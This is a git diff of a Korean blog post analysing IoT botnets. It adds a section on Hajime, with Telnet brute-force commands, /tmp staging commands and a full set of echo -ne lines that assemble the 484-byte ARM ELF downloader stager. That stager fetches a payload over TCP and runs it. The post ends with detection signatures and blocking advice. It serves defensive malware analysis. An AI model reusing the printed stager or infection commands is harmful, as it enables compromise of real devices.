@@ -1,12 +1,13 @@
 ---
 layout: post
-title:  "IoT Botnet Mirai vs Bricker"
+title:  "IoT Botnet Analysis"
 tag:   Analysis
 categories: IoT Analysis mirai Bricker persu
 modified: 2017-04-26
 comments: true
 featured: true
 ---
+
 # Mirai Botnet
 
 - 원문(Reference) : https://security.radware.com/ddos-threats-attacks/threat-advisories-attack-reports/mirai-botnet/
@@ -177,9 +178,6 @@ C&C 서버는 활성화된 Telnet, SSH 포트를 통해 명령을 전송하게 �
 #define ATK_VEC_HTTP       10 /* HTTP layer 7 flood */
 ```
 
-
-
-
 # Bricker botnet
 
 
@@ -269,3 +267,190 @@ rm -rf 를 통해 모든 장치를 지워버리며, TCP timestamps 비활성화,
 
 ### Protecting
 BrickerBot 감염을 막기 위해서는 가장 기본적인 대응방안이 필요하다. 각 디바이스는 Telnet, SSH와 같은 원격 단말 관리 서비스를 비활성화 시켜야 하며, 필요에 의해 활성화 시킬 경우 각 디바이스 별로 유니크한 패스워드 정책을 수립해야 한다. 특히 SSH 사용 시 로그인 방식이 아닌 키교환을 통해 로그인할 수 있도록 구성해야 한다.
+
+
+# Hajime
+
+원문 : http://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/
+
+2017년 4월 27일 16시 경 유명 보안 회사인 "Kaspersky Lab"에 따르면 신종 IoT botnet인 "Hajime"에 300,000 여 IoT Device가 감염되었다고 한다. (사용된 libutp에 2013년이라 표시됨)
+
+이번 Hajime botnet은 2016년 10월 Rapinity Networks의 보안 연구원에 의해 처음 발견되었으며 꾸준히 확산되고 있는 상황이다.
+
+대부분 공격 대상은 웹캡, DVR으로 나타나고 있습니다.
+국가별 통계는 베트남 20%, 대만 13%, 브라질 9% 정도로 나타나고 있다.
+
+## Hajime botnet 동작 과정
+
+원문 : https://security.rapiditynetworks.com/publications/2016-10-16/hajime.pdf
+
+### 1. 정찰
+정찰 부분은 실제로 botnet이 감염된 것은 아니며, 실제 공격을 수행하는 attcking node가 무작위로 ipv4 대역대의 23번 텔넷 포트를 스캔하게 됩니다.
+이후 텔넷 오픈되어 있는 것을 확인하면 attacking node가 가지고 있는 알려진 디폴트 ID/PW를 대입하게 됩니다.
+
+이때 Hajime botnet이 mirai botnet과 "Telnet brute force"공격에서 다른 점은 알려진 디폴트 ID/PW를 순차적으로 대입해보는 것이다. (mirai botnet의 경우 무작위 대입)
+
+Telnet brute force를 통해 shell에 접근이 가능하면 아래 5가지의 명령어를 실행 한다.
+
+```
+enable
+system
+shell
+sh
+/bin/busybox ECCHI
+```
+
+위 명령 중 enable, system, shell, sh 4가지 명령은 shell을 실행 시키기 위함이며, 마지막 /bin/busybox ECCHI를 통해 shell이 잘 실행되는지 파악하기 위함이다. 성공적인 shell 접근을 하기 위해 에러를 발생하는 것이며, mirai의 변형임을 나타나는 부분이기도 하다.
+
+### 2. 침투
+정상적으로 IoT Device에 접근하게 되면 아래 명령을 실행하여 현재 시스템 마운트 상황을 확인하게 된다.
+
+```
+cat /proc/mounts; /bin/busybox ECCHI
+
+rootfs / rootfs rw 0 0
+/dev/root / jffs2 ro,noatime 0 0
+/proc /proc proc rw,nodiratime 0 0
+devpts /dev/pts devpts rw 0 0
+none /tmp ramfs rw 0 0
+/dev/mtdblock6 /tmp/flash jffs2 rw,sync,noatime 0 0
+ECCHI: applet not found
+```
+
+이후 hajime botnet을 생성하기 위해 시스템 내 쓰기 권한이 있는 /proc, /sys, /var, /tmp, / 등 타겟 디렉토리를 찾는다. 이후 아래 명령을 실행하게 된다.
+
+```
+# cd /tmp; cat .s || cp /bin/echo .s; /bin/busybox ECCHI
+# /bin/busybox chmod 777 .s; /bin/busybox ECCHI
+# cat .s; /bin/busybox ECCHI
+# /bin/busybox ECCHI;
+```
+
+실제 IoT Device에서 테스트 결과 /tmp 디렉토리에 .s 파일이 생성된 것을 확인 할 수 있었다.
+```
+# ls -al .s
+-rwxrwxrwx    1 test     root       509436 Apr 28 23:56 .s
+```
+
+이 과정을 수행하는 이유는 3가지가 있다.
+
+1. .s 바이너리의 유무 확인
+2. 해당 디렉토리의 쓰기 가능 여부 확인
+3. .s 바이너리를 생성함으로써 대상 IoT Device의 프로세서 결정
+
+### 3. 1차 감염 : shell code download
+침투 단계에서 이상이 없을 시 hajime botnet을 생성하게 된다.
+
+```
+# echo -ne "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x54\x00\x01\x00\x34\x00\x00\x00\x44\x01\x00\x00\x00\x02\x00\x05\x34\x00\x20\x00\x01\x00\x28\x00\x04\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00" > .s; /bin/busybox ECCHI
+# echo -ne "\x00\x00\x01\x00\xf8\x00\x00\x00\xf8\x00\x00\x00\x05\x00\x00\x00\x00\x00\x01\x00\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x06\x20\xa0\xe3\x07\x00\x2d\xe9\x01\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x0c\xd0\x8d\xe2\x00\x60\xa0\xe1\x70\x10\x8f\xe2\x10\x20\xa0\xe3" >> .s; /bin/busybox ECCHI
+# echo -ne "\x07\x00\x2d\xe9\x03\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x14\xd0\x8d\xe2\x4f\x4f\x4d\xe2\x05\x50\x45\xe0\x06\x00\xa0\xe1\x04\x10\xa0\xe1\x4b\x2f\xa0\xe3\x01\x3c\xa0\xe3\x0f\x00\x2d\xe9\x0a\x00\xa0\xe3\x0d\x10\xa0\xe1\x66\x00\x90\xef\x10\xd0\x8d\xe2" >> .s; /bin/busybox ECCHI
+# echo -ne "\x00\x50\x85\xe0\x00\x00\x50\xe3\x04\x00\x00\xda\x00\x20\xa0\xe1\x01\x00\xa0\xe3\x04\x10\xa0\xe1\x04\x00\x90\xef\xee\xff\xff\xea\x4f\xdf\x8d\xe2\x00\x00\x40\xe0\x01\x70\xa0\xe3\x00\x00\x00\xef\x02\x00\x12\x1c\xc6\x33\x64\x7b\x41\x2a\x00\x00\x00\x61\x65\x61" >> .s; /bin/busybox ECCHI
+# echo -ne "\x62\x69\x00\x01\x20\x00\x00\x00\x05\x43\x6f\x72\x74\x65\x78\x2d\x41\x35\x00\x06\x0a\x07\x41\x08\x01\x09\x02\x0a\x03\x0c\x01\x2a\x01\x44\x01\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x41\x52\x4d\x2e\x61\x74\x74\x72\x69\x62\x75" >> .s; /bin/busybox ECCHI
+# echo -ne "\x74\x65\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x54\x00\x01\x00\x54\x00\x00\x00" >> .s; /bin/busybox ECCHI
+# echo -ne "\xa4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\xf8\x00\x00\x00\x2b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00" >> .s; /bin/busybox ECCHI
+# echo -ne "\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x23\x01\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00" >> .s; /bin/busybox ECCHI
+# cp .s .i; >.i; ./.s>.i; ./.i; rm .s; /bin/busybox ECCHI
+```
+
+echo -ne 명령은 16진수(hex) 문자열을 바이너리 파일로 만들 때 사용하는 명령이다.
+
+```
+study persu$ file .s
+.s: ERROR: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked error reading
+study persu$ ls -al .s
+-rw-r--r--  1 persu  staff  484  4 29 00:24 .s
+```
+
+file 명령어를 통해 확인 결과 ARM CPU에 맞게 바이너리가 구성된 것을 알 수 있다.
+최종적으로 실제 hajime bonet이 484 byte의 ELF 파일로 만들어 지게 된다.
+
+<img src="{{ site.url }}/images/persu/arm.png" style="display: block; margin: auto;">
+
+ARM 프로세서는 공부 중에 있어 완벽하게 이해를 못한 상황이다(shell code 인걸로 추정). 원문을 통해 TCP 연결을 통해 byte date를 host로 보내고 수신 된 모든 byte를 stdout으로 출력합니다. stdout은 .i 파일로 파이프되어 실행되는 것을 알 수 있다.
+
+hajime botnet hash : https://github.com/Psychotropos/hajime_hashes
+
+### 4. 2차 감염 : DHT Downloader
+이 단계는 hajime botnet이 P2P 네트워크에서 payload를 검색하고 실행하는 단계이다. P2P 네트워크는 BitTorrent에서 사용되는 여러 프로토콜을 기반으로 사용한다.
+
+Hajime는 피어 검색 및 uTP(데이터 교환) 위해 BitTorrent의 DHT 프로토콜을 사용한다.
+
+1. 자체 개발한 라이브러리 다운로드
+2. 정보 교환을 위해 Hajime은 BitTorrent DHT 프로토콜 준비 (piggybacks on BitTorrent’s DHT overlay network)
+3. Hajime은 피어와 함께 파일을 전송하기 위해 libutp에있는 uTP 구현
+4. Hajime은 LZ4방식으로 압축 된 페이로드를 포함한 파일을 다운로드
+5. 시그니처 핑거 프린팅을 통해 페이로드 파일을 식별
+6. 메인 루틴인 KadNode 함수 내 conf_init와 conf_check를 통해 기본 할당 및 초기화를 담당
+7. pool.ntp.org에 대한 쿼리로 결과를에서 오프셋으로 NTP 캐싱
+8. 실행 후 프로세스 이름 변경 : 먼저, strcpy 함수를 사용
+prctl (PR_SET_NAME,argv [0]) syscall. 을 통해 프로세스의 argv [0]에 "telnetd"문자열로 변환 -> 자신을 telent으로 속이기 위함 (.p / .d 프로세스가 telnet으로 변환)
+
+### 5. 실행
+
+피어로 부터 가장 최신의 설정 파일을 다운로드 하기 위해 설정
+BitTorrent DHT의 피어 조회시 Torrent 메타 데이터의 SHA1 해시 값을 생성하기 위해 160 비트 "info_hash"값을 생성한다.
+
+#### info_hash 생성 로직
+1. 현재 UTC 정보 확인
+2. D(몇일)-M(1월:0, 2월:1)-Y(현재년수 - 1900)-W(일요일:0, 금요일:6)-Z(x월x일-1월1일) 형식으로 UTC 정보 변환
+- ex) Oct. 1, 2016, date as 1-9-116-6-274,
+3. 하이픈 ('-')을 추가 해당 날짜의 16 진수 표현
+4. 전체 문자열에 대한 SHA1 해시를 계산하여 info_hash 생성
+
+uTP를 이용해 10분 마다 info_hash를 가진 피어에 도달하여 설정파일을 다운로드 받고 파싱하게 된다.
+
+```
+[modules]
+exp.arm5.1475686338
+.i.arm5.1475781691
+exp.x64.1476038380
+exp.arm7.1476190023
+.i.mipsel.1476038376
+.i.arm7.1475797474
+exp.mipsel.1476249252
+[peers]
+router.utorrent.com
+router.bittorrent.com
+```
+
+info_hash를 가진 피어에 도달한 설정파일의 모듈(바이너리)과 피어는 위 내용과 같다. (계속 변함)
+모듈을 통해 다양한 프로세서를 지원하는 것을 알 수 있으며, ".(콤마)" 를 통해 파일이름, 모듈, 타임스탬프를 구분하게 된다.
+
+위 모듈의 정보와 자신이 가지고 있는 모듈의 정보를 비교하여 최신 날짜의 모듈을 다운로드하게 된다.
+이때 hajime에 감염된 프로세서에 맞는 모듈을 .p 디렉토리에 다운로드 받게 된다.
+
+실행 중인 모듈에 대해서는 .p/.d에 설정파일을 저장하며, 새로운 바이너리를 .i로 압축 해제하여 execv를 이용해 실행하게 된다.
+
+### 6. 전파
+
+exp 모듈(바이너리)의 다른 IoT Device에 Telnet brute force를 통해 hajime botnet을 전파하는 역할이다.
+
+## Hajime botnet 대책
+
+### 1. Block UDP packets containing P2P traffic
+hajime botnet은 기본적으로 UDP 기반의 P2P 프로토콜을 사용하는 것이다. 이때 사용되는 주요 메시지를 차단하는 방법이다.
+
+```
+00 00 00 21 00 00 c0 dd 26 97 c4 a1 7d f8 3f 36
+a9 97 99 dd 38 49 58 72 84 90 fa c7 d1 31 82 05
+2d 88 4e 6e 42 84
+```
+
+### 2. Block TCP connections containing attack traffic
+"/bin/busybox ECCHI" 명령 사용은 mirai, hajime의 공통점이다. 해당 문자열이 포함된 패킷을 차단하거나 감염 의심해야 한다.
+
+### 3. Block TCP port
+1차 감염이후 2차 감염을 위해 파일을 다운로드 하는 port는 4636으로 정해져 있다. blacklist방식으로 port 차단하는 것은 좋은 방법은 아니지만 이 방법 또한 하나의 대응방안이 될 수 있다.
+
+## Hajime botnet 목적
+hajime botnet의 목적은 대량의 IoT Device를 감염시켜 DDoS에 사용하기 위함이 기본이다.
+하지만 mirai와 같이 오픈소스화 되지 않아 공격자가 정의한 페이로드에 따라 다양한 목적에 사용될 것이다.
+
+## Hajime와 mirai의 관계
+Hajime는 mirai와 최초 디바이스 접근 부분이 Telnet을 사용하고 있고 명령 수행시 ECCHI를 사용하지만 동작과정은 botnet의 한 종류인 qbot과 많이 유사하다. mirai의 변종으로 속이기 위한 수단이 아닐까 한다.
+
+# Amnesia
+
+
+IP CCTV 감염 사례 : http://www.kerneronsec.com/2016/02/remote-code-execution-in-cctv-dvrs-of.html
